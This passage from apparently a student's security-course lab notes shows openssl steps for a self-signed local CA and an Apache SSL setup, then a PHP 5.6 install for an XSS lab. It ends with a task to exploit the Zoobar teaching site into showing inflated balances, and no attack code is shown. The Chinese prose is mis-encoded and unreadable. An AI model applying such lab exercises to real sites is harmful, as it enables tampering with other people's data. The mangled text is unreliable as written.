class="language-bash">[ local_ca ]</span></span><br><span class="line">dir             = /home/username/myCA                    # è¿™é‡Œè¦å°†usernameæ›¿æ¢ä¸ºä½ çš„ç”¨æˆ·å</span><br><span class="line">certificate     = $dir/cacert.pem</span><br><span class="line">database        = $dir/index.txt</span><br><span class="line">new_certs_dir   = $dir/signedcerts</span><br><span class="line">private_key     = $dir/private/cakey.pem</span><br><span class="line">serial          = $dir/serial</span><br><span class="line"><span class="meta"># </span><span class="language-bash"> </span>     </span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Default expiration and encryption policies for certificates.</span></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">default_crl_days        = 365</span></span><br><span class="line">default_days            = 1825</span><br><span class="line">default_md              = SHA256</span><br><span class="line"><span class="meta"># </span><span class="language-bash"> </span>     </span><br><span class="line">policy          = local_ca_policy</span><br><span class="line">x509_extensions = local_ca_extensions</span><br><span class="line"><span class="meta"># </span><span class="language-bash"> </span>     </span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Default policy to use when generating server certificates.  The following</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">fields must be defined <span class="keyword">in</span> the server certificate.</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[ local_ca_policy ]</span></span><br><span class="line">commonName              = supplied</span><br><span class="line">stateOrProvinceName     = supplied</span><br><span class="line">countryName             = supplied</span><br><span class="line">emailAddress            = supplied</span><br><span class="line">organizationName        = supplied</span><br><span class="line">organizationalUnitName  = supplied</span><br><span class="line"><span class="meta"># </span><span class="language-bash"> </span>     </span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># x509 extensions to use when generating server certificates.</span></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[ local_ca_extensions ]</span></span><br><span class="line">subjectAltName          = DNS:localhost</span><br><span class="line">basicConstraints        = CA:false</span><br><span class="line">nsCertType              = server</span><br><span class="line"><span class="meta"># </span><span class="language-bash"> </span>     </span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># The default root certificate generation policy.</span></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[ req ]</span></span><br><span class="line">default_bits    = 2048</span><br><span class="line">default_keyfile = /home/username/myCA/private/cakey.pem  # è¿™é‡Œè¦å°†usernameæ›¿æ¢ä¸ºä½ çš„ç”¨æˆ·å</span><br><span class="line">default_md      = SHA256</span><br><span class="line"><span class="meta"># </span><span class="language-bash"> </span>     </span><br><span class="line">prompt                  = no</span><br><span class="line">distinguished_name      = root_ca_distinguished_name</span><br><span class="line">x509_extensions         = root_ca_extensions</span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Root Certificate Authority distinguished name.  Change these fields to match</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">your <span class="built_in">local</span> environment!</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[ root_ca_distinguished_name ]</span></span><br><span class="line">commonName              = MyOwn Root Certificate Authority # CAæœºæ„å</span><br><span class="line">stateOrProvinceName     = JS                               # CAæ‰€åœ¨çœä»½</span><br><span class="line">countryName             = CN                               # CAæ‰€åœ¨å›½å®¶ï¼ˆä»…é™2ä¸ªå­—ç¬¦ï¼‰</span><br><span class="line">emailAddress            = XXXX@XXX.com                     # é‚®ç®±</span><br><span class="line">organizationName        = XXX                              # </span><br><span class="line">organizationalUnitName  = XXX                              # </span><br><span class="line"><span class="meta"># </span><span class="language-bash"> </span>     </span><br><span class="line">[ root_ca_extensions ]</span><br><span class="line">basicConstraints        = CA:true</span><br></pre></td></tr></table></figure>

<p>ç”ŸæˆCAæ ¹è¯ä¹¦å’Œå¯†é’¥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export OPENSSL_CONF=~/myCA/caconfig.cnf       #è¯¥å‘½ä»¤ç”¨äºç»™ç¯å¢ƒå˜é‡ OPENSSL_CONF èµ‹å€¼ä¸ºcaconfig.cnfã€‚</span><br><span class="line">openssl req -x509 -newkey rsa:2048 -out cacert.pem -outform PEM -days 1825             # ç”Ÿæˆ CA æ ¹è¯ä¹¦å’Œå¯†é’¥</span><br></pre></td></tr></table></figure>

<p>è¯¥å‘½ä»¤éœ€è¦ç”¨æˆ·è®¾ç½®å¯†ç ã€‚ä¸è¦å¿˜è®°ã€‚<br>ä»¥ä¸Šæ­¥éª¤ç”Ÿæˆäº† CA è‡ªç­¾åæ ¹è¯ä¹¦ï¼Œå’Œ RSA å…¬&#x2F;ç§å¯†é’¥å¯¹ã€‚è¯ä¹¦çš„æ ¼å¼æ˜¯ PEMï¼Œæœ‰æ•ˆæœŸæ˜¯1825å¤©ã€‚</p>
<ul>
<li>&#x2F;myCA&#x2F;cacert.pem: CA æ ¹è¯ä¹¦</li>
<li>&#x2F;myCA&#x2F;private&#x2F;cakey.pemï¼š CA ç§é’¥</li>
</ul>
<h3 id="åˆ›å»ºæœåŠ¡å™¨å…¬ç§é’¥"><a href="#åˆ›å»ºæœåŠ¡å™¨å…¬ç§é’¥" class="headerlink" title="åˆ›å»ºæœåŠ¡å™¨å…¬ç§é’¥"></a>åˆ›å»ºæœåŠ¡å™¨å…¬ç§é’¥</h3><p>ç”ŸæˆæœåŠ¡å™¨é…ç½®æ–‡ä»¶exampleserver.cnf</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim ~/myCA/exampleserver.cnf</span><br></pre></td></tr></table></figure>

<p>exampleserver.cnfæ–‡ä»¶å†…å®¹å¦‚ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># exampleserver.cnf</span></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[ req ]</span></span><br><span class="line">prompt             = no</span><br><span class="line">distinguished_name = server_distinguished_name</span><br><span class="line">[ server_distinguished_name ]</span><br><span class="line">commonName              = localhost          # æœåŠ¡å™¨åŸŸå</span><br><span class="line">stateOrProvinceName     = JS                 # æœåŠ¡å™¨æ‰€åœ¨çœä»½</span><br><span class="line">countryName             = CN                 # æœåŠ¡å™¨æ‰€åœ¨å›½å®¶ï¼ˆä»…é™2ä¸ªå­—ç¬¦ï¼‰</span><br><span class="line">emailAddress            = XXXX@XXX.com       # é‚®ç®±</span><br><span class="line">organizationName        = XXX                # </span><br><span class="line">organizationalUnitName  = XXX                # </span><br></pre></td></tr></table></figure>

<p>ç”ŸæˆæœåŠ¡å™¨è¯ä¹¦å’Œå¯†é’¥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export OPENSSL_CONF=~/myCA/exampleserver.cnf   # è¯¥å‘½ä»¤è®¾ç½®ç¯å¢ƒå˜é‡ OPENSSL_CONFï¼Œä½¿å¾— openssl æ›´æ¢é…ç½®æ–‡ä»¶ã€‚</span><br><span class="line">openssl req -newkey rsa:2048 -keyout tempkey.pem -keyform PEM -out tempreq.pem -outform PEM</span><br></pre></td></tr></table></figure>

<p>åŒæ ·çš„ï¼Œéœ€è¦è¾“å…¥å¯†ç çŸ­è¯­ã€‚<br>ä¹‹åï¼Œæœ‰2ç§å¯¹ä¸´æ—¶ç§˜é’¥çš„æ“ä½œï¼Œé€‰æ‹©å…¶ä¸€å³å¯<br>1.å°†ä¸´æ—¶ç§é’¥è½¬æ¢ä¸º unencrypted keyï¼Œå³ç§˜é’¥ä¸åŠ å¯†çŠ¶æ€ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl rsa -in tempkey.pem -out server_key.pem</span><br></pre></td></tr></table></figure>

<p>éœ€è¦è¾“å…¥å¯†ç çŸ­è¯­ã€‚</p>
<p>2.å¦‚æœå¸Œæœ›å°† key ä¿æŒä¸ºåŠ å¯†çŠ¶æ€ï¼Œç›´æ¥æ”¹å</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mv tempkey.pem server_key.pem</span><br></pre></td></tr></table></figure>

<p>ä¸¤è€…çš„åŒºåˆ«æ˜¯ï¼Œç¬¬äºŒç§éœ€è¦åœ¨æœåŠ¡å™¨å¯åŠ¨æ—¶è¾“å…¥ç§é’¥çš„å¯†ç çŸ­è¯­ï¼Œå¦åˆ™ä¼šå¯¼è‡´æœåŠ¡å™¨å¯åŠ¨å¤±è´¥ï¼Œä½†ç¬¬äºŒç§å®‰å…¨æ€§é«˜äºç¬¬ä¸€ç§ï¼Œå¯ä»¥æ›´å¥½çš„ä¿æŠ¤ç§˜é’¥ã€‚</p>
<h3 id="ä½¿ç”¨CA-keyå¯¹æœåŠ¡å™¨è¯ä¹¦ç­¾å"><a href="#ä½¿ç”¨CA-keyå¯¹æœåŠ¡å™¨è¯ä¹¦ç­¾å" class="headerlink" title="ä½¿ç”¨CA keyå¯¹æœåŠ¡å™¨è¯ä¹¦ç­¾å"></a>ä½¿ç”¨CA keyå¯¹æœåŠ¡å™¨è¯ä¹¦ç­¾å</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export OPENSSL_CONF=~/myCA/caconfig.cnf</span><br><span class="line">openssl ca -in tempreq.pem -out server_crt.pem</span><br></pre></td></tr></table></figure>

<p>åˆ é™¤ä¸´æ—¶è¯ä¹¦å’Œå¯†ç æ–‡ä»¶</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -f tempkey.pem &amp;&amp; rm -f tempreq.pem</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨ï¼Œè‡ªç­¾åçš„æœåŠ¡å™¨è¯ä¹¦å’Œå¯†é’¥å¯¹ä¾¿äº§ç”Ÿäº†ï¼š</p>
<ul>
<li>server_crt.pem : æœåŠ¡å™¨è¯ä¹¦æ–‡ä»¶</li>
<li>server_key.pem : æœåŠ¡å™¨å¯†é’¥æ–‡ä»¶</li>
</ul>
<h3 id="é…ç½®Apache"><a href="#é…ç½®Apache" class="headerlink" title="é…ç½®Apache"></a>é…ç½®Apache</h3><p>å®‰è£…apache2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install apache2</span><br></pre></td></tr></table></figure>



<p>å»ºç«‹sslé…ç½®æ–‡ä»¶ï¼Œlab-ssl.conf</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/apache2/sites-available/lab-ssl.conf</span><br></pre></td></tr></table></figure>

<p>lab-ssl.confæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p>
<p>æ³¨æ„è¿™é‡Œæœ‰ä¸¤å¤„usernameéœ€è¦æ¢æˆä½ çš„ç”¨æˆ·åã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;IfModule mod_ssl.c&gt;</span><br><span class="line">	&lt;VirtualHost _default_:443&gt;</span><br><span class="line">		ServerAdmin webmaster@localhost</span><br><span class="line"></span><br><span class="line">		DocumentRoot /var/www/html</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">Available loglevels: trace8, ..., trace1, debug, info, notice, warn,</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">error, crit, alert, emerg.</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">It is also possible to configure the loglevel <span class="keyword">for</span> particular</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">modules, e.g.</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">LogLevel info ssl:warn</span></span><br><span class="line"></span><br><span class="line">		ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span><br><span class="line">		CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">For most configuration files from conf-available/, <span class="built_in">which</span> are</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">enabled or disabled at a global level, it is possible to</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">include a line <span class="keyword">for</span> only one particular virtual host. For example the</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">following line enables the CGI configuration <span class="keyword">for</span> this host only</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">after it has been globally disabled with <span class="string">&quot;a2disconf&quot;</span>.</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">Include conf-available/serve-cgi-bin.conf</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  SSL Engine Switch:</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  Enable/Disable SSL <span class="keyword">for</span> this virtual host.</span></span><br><span class="line">		SSLEngine on</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  A self-signed (snakeoil) certificate can be created by installing</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  the ssl-cert package. See</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  /usr/share/doc/apache2/README.Debian.gz <span class="keyword">for</span> more info.</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  If both key and certificate are stored <span class="keyword">in</span> the same file, only the</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  SSLCertificateFile directive is needed.</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">SSLCertificateFile	/etc/ssl/certs/ssl-cert-snakeoil.pem</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">ç½‘ç«™è¯ä¹¦å’Œç§é’¥åœ°å€</span></span><br><span class="line">		SSLCertificateFile    /home/username/myCA/server_crt.pem # è¿™é‡Œçš„usernameéœ€è¦æ¢æˆä½ çš„ç”¨æˆ·å</span><br><span class="line">		SSLCertificateKeyFile /home/username/myCA/server_key.pem # è¿™é‡Œçš„usernameéœ€è¦æ¢æˆä½ çš„ç”¨æˆ·å</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  Server Certificate Chain:</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  Point SSLCertificateChainFile at a file containing the</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  concatenation of PEM encoded CA certificates <span class="built_in">which</span> form the</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  certificate chain <span class="keyword">for</span> the server certificate. Alternatively</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  the referenced file can be the same as SSLCertificateFile</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  when the CA certificates are directly appended to the server</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  certificate <span class="keyword">for</span> convinience.</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">SSLCertificateChainFile /etc/apache2/ssl.crt/server-ca.crt</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  Certificate Authority (CA):</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  Set the CA certificate verification path <span class="built_in">where</span> to find CA</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  certificates <span class="keyword">for</span> client authentication or alternatively one</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  huge file containing all of them (file must be PEM encoded)</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  Note: Inside SSLCACertificatePath you need <span class="built_in">hash</span> symlinks</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">		 to point to the certificate files. Use the provided</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">		 Makefile to update the <span class="built_in">hash</span> symlinks after changes.</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">SSLCACertificatePath /etc/ssl/certs/</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">SSLCACertificateFile /etc/apache2/ssl.crt/ca-bundle.crt</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  Certificate Revocation Lists (CRL):</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  Set the CA revocation path <span class="built_in">where</span> to find CA CRLs <span class="keyword">for</span> client</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  authentication or alternatively one huge file containing all</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  of them (file must be PEM encoded)</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  Note: Inside SSLCARevocationPath you need <span class="built_in">hash</span> symlinks</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">		 to point to the certificate files. Use the provided</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">		 Makefile to update the <span class="built_in">hash</span> symlinks after changes.</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">SSLCARevocationPath /etc/apache2/ssl.crl/</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">SSLCARevocationFile /etc/apache2/ssl.crl/ca-bundle.crl</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  Client Authentication (Type):</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  Client certificate verification <span class="built_in">type</span> and depth.  Types are</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  none, optional, require and optional_no_ca.  Depth is a</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  number <span class="built_in">which</span> specifies how deeply to verify the certificate</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  issuer chain before deciding the certificate is not valid.</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">SSLVerifyClient require</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">SSLVerifyDepth  10</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  SSL Engine Options:</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  Set various options <span class="keyword">for</span> the SSL engine.</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  o FakeBasicAuth:</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">	 Translate the client X.509 into a Basic Authorisation.  This means that</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">	 the standard Auth/DBMAuth methods can be used <span class="keyword">for</span> access control.  The</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">	 user name is the `one line<span class="string">&#x27; version of the client&#x27;</span>s X.509 certificate.</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">	 Note that no password is obtained from the user. Every entry <span class="keyword">in</span> the user</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">	 file needs this password: `xxj31ZMTZzkVA<span class="string">&#x27;.</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">  o ExportCertData:</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 This exports two additional environment variables: SSL_CLIENT_CERT and</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 SSL_SERVER_CERT. These contain the PEM-encoded certificates of the</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 server (always existing) and the client (only existing when client</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 authentication is used). This can be used to import the certificates</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 into CGI scripts.</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">  o StdEnvVars:</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 This exports the standard SSL/TLS related `SSL_*&#x27;</span> environment variables.</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">	 Per default this exportation is switched off <span class="keyword">for</span> performance reasons,</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">	 because the extraction step is an expensive operation and is usually</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">	 useless <span class="keyword">for</span> serving static content. So one usually enables the</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">	 exportation <span class="keyword">for</span> CGI and SSI requests only.</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  o OptRenegotiate:</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">	 This enables optimized SSL connection renegotiation handling when SSL</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">	 directives are used <span class="keyword">in</span> per-directory context.</span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash">SSLOptions +FakeBasicAuth +ExportCertData +StrictRequire</span></span><br><span class="line">		&lt;FilesMatch &quot;\.(cgi|shtml|phtml|php)$&quot;&gt;</span><br><span class="line">				SSLOptions +StdEnvVars</span><br><span class="line">		&lt;/FilesMatch&gt;</span><br><span class="line">		&lt;Directory /usr/lib/cgi-bin&gt;</span><br><span class="line">				SSLOptions +StdEnvVars</span><br><span class="line">		&lt;/Directory&gt;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  SSL Protocol Adjustments:</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  The safe and default but still SSL/TLS standard compliant shutdown</span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash">  approach is that mod_ssl sends the close notify alert but doesn<span class="string">&#x27;t wait for</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">  the close notify alert from client. When you need a different shutdown</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">  approach you can use one of the following variables:</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">  o ssl-unclean-shutdown:</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 This forces an unclean shutdown when the connection is closed, i.e. no</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 SSL close notify alert is send or allowed to received.  This violates</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 the SSL/TLS standard but is needed for some brain-dead browsers. Use</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 this when you receive I/O errors because of the standard approach where</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 mod_ssl sends the close notify alert.</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">  o ssl-accurate-shutdown:</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 This forces an accurate shutdown when the connection is closed, i.e. a</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 SSL close notify alert is send and mod_ssl waits for the close notify</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 alert of the client. This is 100% SSL/TLS standard compliant, but in</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 practice often causes hanging connections with brain-dead browsers. Use</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 this only for browsers where you know that their SSL implementation</span></span></span><br><span class="line"><span class="meta">		#</span><span class="language-bash"><span class="string">	 works correctly.</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">  Notice: Most problems of broken clients are also related to the HTTP</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">  keep-alive facility, so you usually additionally want to disable</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">  keep-alive for those clients, too. Use variable &quot;nokeepalive&quot; for this.</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">  Similarly, one has to force some clients to use HTTP/1.0 to workaround</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">  their broken HTTP/1.1 implementation. Use variables &quot;downgrade-1.0&quot; and</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">  &quot;force-response-1.0&quot; for this.</span></span></span><br><span class="line"><span class="meta">		# </span><span class="language-bash"><span class="string">BrowserMatch &quot;MSIE [2-6]&quot; \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">		#		nokeepalive ssl-unclean-shutdown \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">		#		downgrade-1.0 force-response-1.0</span></span></span><br><span class="line"></span><br><span class="line">	&lt;/VirtualHost&gt;</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"><span class="string">vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span></span></span><br></pre></td></tr></table></figure>

<p>å¯åŠ¨sslæœåŠ¡</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo a2ensite /etc/apache2/sites-available/lab-ssl.conf</span><br><span class="line">sudo a2enmod ssl</span><br></pre></td></tr></table></figure>

<p>è®©æµè§ˆå™¨ä¿¡ä»»æˆ‘ä»¬è‡ªå»ºçš„CA</p>
<p>æ‰“å¼€ FireFox æµè§ˆå™¨ï¼Œä¾æ¬¡é€‰æ‹©â€œç¼–è¾‘â€â€”-â€œé¦–é€‰é¡¹â€â€”-â€œéšç§ä¸å®‰å…¨â€â€”-â€œè¯ä¹¦â€â€”-â€œæŸ¥çœ‹è¯ä¹¦â€â€”-â€œè¯ä¹¦æœºæ„â€ï¼Œç‚¹å‡»å¯¼å…¥ï¼Œé€‰æ‹© myCA ç›®å½•ä¸‹çš„æ ¹è¯ä¹¦â€œcacert.pemâ€, å¯¼å…¥ã€‚</p>
<p>åœ¨æµè§ˆå™¨åœ°å€æ è¾“å…¥ <a href="https://localhost/">https://localhost</a></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211804732.png" alt="img"></p>
]]></content>
      <categories>
        <category>ä¿¡æ¯å®‰å…¨å®è·µ</category>
      </categories>
      <tags>
        <tag>ä¿¡æ¯å®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¿¡æ¯å®‰å…¨å®è·µLab2-CSS</title>
    <url>/2021/12/21/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5Lab2-CSS/</url>
    <content><![CDATA[<h1 id="ä¿¡æ¯å®‰å…¨å®è·µLab2-CSS"><a href="#ä¿¡æ¯å®‰å…¨å®è·µLab2-CSS" class="headerlink" title="ä¿¡æ¯å®‰å…¨å®è·µLab2-CSS"></a>ä¿¡æ¯å®‰å…¨å®è·µLab2-CSS</h1><h2 id="Ubuntu20-04-å®‰è£…-php5-6-ï¼Œphp5-6-mysqlï¼Œapache2ï¼Œmysql5-7"><a href="#Ubuntu20-04-å®‰è£…-php5-6-ï¼Œphp5-6-mysqlï¼Œapache2ï¼Œmysql5-7" class="headerlink" title="Ubuntu20.04 å®‰è£… php5.6 ï¼Œphp5.6-mysqlï¼Œapache2ï¼Œmysql5.7"></a>Ubuntu20.04 å®‰è£… php5.6 ï¼Œphp5.6-mysqlï¼Œapache2ï¼Œmysql5.7</h2><h3 id="å®‰è£…php5-6ï¼Œphp5-6-mysqlï¼Œapache2"><a href="#å®‰è£…php5-6ï¼Œphp5-6-mysqlï¼Œapache2" class="headerlink" title="å®‰è£…php5.6ï¼Œphp5.6-mysqlï¼Œapache2"></a>å®‰è£…php5.6ï¼Œphp5.6-mysqlï¼Œapache2</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y language-pack-en-base</span><br><span class="line"></span><br><span class="line">sudo LC_ALL=en_US.UTF-8 add-apt-repository ppa:ondrej/php</span><br><span class="line"></span><br><span class="line">sudo add-apt-repository ppa:ondrej/php</span><br><span class="line"></span><br><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">sudo apt-get install php5.6</span><br><span class="line"></span><br><span class="line">sudo apt-get install php5.6-mysql</span><br><span class="line"></span><br><span class="line">sudo apt-get apache2</span><br><span class="line"></span><br><span class="line">sudo a2dismod php7.4</span><br><span class="line"></span><br><span class="line">sudo a2enmod php5.6</span><br><span class="line"></span><br><span class="line">sudo service apache2 restart</span><br></pre></td></tr></table></figure>

<h3 id="å®‰è£…mysql5-7"><a href="#å®‰è£…mysql5-7" class="headerlink" title="å®‰è£…mysql5.7"></a>å®‰è£…mysql5.7</h3><p><a href="https://blog.csdn.net/Deadly_97/article/details/111675825">https://blog.csdn.net/Deadly_97/article/details/111675825</a></p>
<h2 id="é—®é¢˜1"><a href="#é—®é¢˜1" class="headerlink" title="é—®é¢˜1"></a>é—®é¢˜1</h2><h2 id="é—®é¢˜2-Zoobarç½‘ç«™å¯»æ‰¾æ¼æ´"><a href="#é—®é¢˜2-Zoobarç½‘ç«™å¯»æ‰¾æ¼æ´" class="headerlink" title="é—®é¢˜2:Zoobarç½‘ç«™å¯»æ‰¾æ¼æ´"></a>é—®é¢˜2:Zoobarç½‘ç«™å¯»æ‰¾æ¼æ´</h2><p>Manage your profile in the zoobar website, make your zoobars appear more than you really own. That is, after you modify your profile, when others or yourself look up your profile, they will see more zoobars than you actually own.</p>
